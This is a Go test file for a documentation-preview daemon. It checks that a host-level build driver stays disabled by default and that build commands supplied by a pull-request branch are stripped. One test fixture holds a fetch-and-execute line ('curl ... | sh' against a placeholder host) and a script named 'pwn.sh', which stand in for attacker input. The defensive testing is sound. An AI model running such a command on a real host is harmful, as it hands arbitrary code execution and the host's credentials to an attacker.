package daemon

import (
	"strings"
	"testing"

	"github.com/netfoundry/docpreview/internal/config"
	"github.com/netfoundry/docpreview/internal/model"
	"github.com/netfoundry/docpreview/internal/store"
)

func driverPR() model.PullRequest {
	return model.PullRequest{
		Repo:   model.Repo{Platform: model.PlatformGitHub, Owner: "acme", Name: "docs"},
		Number: 7, Branch: "add-guide", HeadSHA: "85912e2abcdef",
	}
}

// TestLocalDriverIsRefusedUnlessEnabled.
//
// The local driver runs the pull request's own build on this host: `npm install` executes
// every dependency's postinstall script and `npm run build` executes whatever the branch's
// package.json says, as the daemon's user, on the machine holding the GitHub App private
// key and every project's tokens. That is what the driver *is*, not a bug in it — so the
// only safe default is off, and arriving at it by accident must be impossible.
//
// Three ways it could have been arrived at by accident, all closed: the shipped default is
// docker; a daemon that cannot find docker fails builds rather than falling back; and a
// project row naming it is refused here even though the row is the operator's own, because
// the row is not where that decision belongs.
func TestLocalDriverIsRefusedUnlessEnabled(t *testing.T) {
	_, d, _ := testIngress(t, &fakeClient{})

	d.cfg.Build.AllowLocalDriver = false
	err := d.driverAllowed(config.DriverLocal)
	if err == nil {
		t.Fatal("the local driver was allowed on a daemon that never enabled it")
	}
	// The operator's next question is what to do, so the message has to carry the key.
	if !strings.Contains(err.Error(), "build.allow_local_driver") {
		t.Errorf("the refusal does not name the setting: %v", err)
	}

	if err := d.driverAllowed(config.DriverDocker); err != nil {
		t.Errorf("docker was refused: %v", err)
	}

	d.cfg.Build.AllowLocalDriver = true
	if err := d.driverAllowed(config.DriverLocal); err != nil {
		t.Errorf("the local driver was refused after being enabled: %v", err)
	}
}

// TestDockerIsTheShippedDefault — the default must be docker, because most deployments never touch this key,
// and a local default would run branch-authored build scripts directly on the host. This is the single most
// consequential line in the config package.
func TestDockerIsTheShippedDefault(t *testing.T) {
	c := config.DefaultServer()
	if c.Build.Driver != config.DriverDocker {
		t.Errorf("default driver = %q, want %q", c.Build.Driver, config.DriverDocker)
	}
	if c.Build.AllowLocalDriver {
		t.Error("the local driver is enabled by default")
	}
}

// TestLocalDriverDropsBranchSuppliedCode enforces the promise in
// `www/docs/reference/repo-config.md`: build.command is ignored under the local driver because it would run
// as arbitrary shell on the host. confineToDriver strips a branch-supplied command before buildLocal runs it
// through cmd /c. The detect script still runs on the host under either driver, before the driver is
// resolved, so this does not make the local driver safe on its own — see the comment on confineToDriver.
func TestLocalDriverDropsBranchSuppliedCode(t *testing.T) {
	_, d, _ := testIngress(t, &fakeClient{})
	ctx := t.Context()
	pr := driverPR()

	// What arrived in the pull request.
	branch := config.RepoConfig{Build: config.RepoBuild{
		Command: "curl https://example.invalid/x.sh | sh",
	}}
	branch.Detect.Script = "ci/pwn.sh"

	got := d.confineToDriver(ctx, pr, branch, config.DriverLocal)
	if got.Build.Command != config.DefaultBuildCommand {
		t.Errorf("command = %q; a branch chose what runs on this host", got.Build.Command)
	}
	if got.Detect.Script != "" {
		t.Errorf("detect script = %q; a branch chose what runs on this host", got.Detect.Script)
	}

	// Under docker the container is the boundary and honouring the repository is the
	// intended design — dropping it there would break every repository that configures
	// its own build, for no gain.
	got = d.confineToDriver(ctx, pr, branch, config.DriverDocker)
	if got.Build.Command != branch.Build.Command || got.Detect.Script != branch.Detect.Script {
		t.Error("the docker driver dropped the repository's own configuration")
	}
}

// TestAProjectSuppliedCommandSurvivesTheLocalDriver — the row is the operator's, cannot
// be edited by a contributor, and is the whole reason a project outranks the branch.
// Confining the branch must not confine the operator, or the local driver becomes
// unusable for the case it legitimately exists for.
func TestAProjectSuppliedCommandSurvivesTheLocalDriver(t *testing.T) {
	_, d, st := testIngress(t, &fakeClient{})
	ctx := t.Context()
	pr := driverPR()

	if err := st.SaveProject(ctx, store.Project{
		Platform: "github", Owner: "acme", Repo: "docs", Enabled: true,
		BuildCommand: "./operator-owned.sh", DetectScript: "ci/operator-owned.sh",
	}); err != nil {
		t.Fatal(err)
	}

	// applyProject has already overlaid these by the time confineToDriver runs, which is
	// what makes them indistinguishable from branch values without the project lookup.
	cfg := config.RepoConfig{Build: config.RepoBuild{Command: "./operator-owned.sh"}}
	cfg.Detect.Script = "ci/operator-owned.sh"

	got := d.confineToDriver(ctx, pr, cfg, config.DriverLocal)
	if got.Build.Command != "./operator-owned.sh" {
		t.Errorf("command = %q, want the project's own", got.Build.Command)
	}
	if got.Detect.Script != "ci/operator-owned.sh" {
		t.Errorf("detect script = %q, want the project's own", got.Detect.Script)
	}
}
